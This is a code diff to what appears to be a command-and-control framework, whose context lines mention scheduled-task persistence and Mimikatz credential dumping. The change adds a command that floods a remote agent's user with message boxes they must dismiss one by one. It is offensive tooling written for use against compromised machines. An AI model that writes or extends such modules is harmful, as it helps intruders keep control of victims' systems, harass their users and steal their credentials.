@@ -462,6 +462,28 @@ class TaskWaterfall(BaseCommand):
             print("ScheduledTaskPingPersistence encountered an error:", e)
 
 
+class MessageBoxWaterfall(BaseCommand):
+    command_name = "message_box_waterfall"
+    command_help = (
+        "\tUsage: `message_box_waterfall <title> <box_content> <number_of_boxes: INT>`\n"
+        "\tSpawns X number of message boxes with title and content. User has to click `ok` on all of them :)\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        if len(args_list) < 3:
+            raise ValueError("need 3 args")
+        self.title = args_list[0]
+        self.content = args_list[1]
+        self.num_of_boxes = int(args_list[2])
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        for i in range(0, self.num_of_boxes):
+            cmd = f"messagebox {self.title} {self.content}"
+            self.agent_class.enqueue_command(cmd)
+
+
 ######################################
 # 10. Credential Dumping (Mimikatz)
 ######################################
